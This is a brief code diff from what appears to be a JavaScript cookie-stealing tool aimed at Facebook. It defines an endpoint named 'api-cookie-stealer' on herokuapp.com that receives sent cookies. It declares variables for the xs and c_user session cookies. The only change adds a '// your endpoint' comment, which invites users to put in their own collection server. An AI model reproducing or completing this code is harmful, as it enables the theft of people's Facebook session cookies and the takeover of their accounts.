@@ -1,5 +1,5 @@
 var url = "https://www.facebook.com";
-var endpoint = "https://api-cookie-stealer.herokuapp.com/send_cookie";
+var endpoint = "https://api-cookie-stealer.herokuapp.com/send_cookie"; // your endpoint
 
 var xs = {}; 
 var c_user = {};
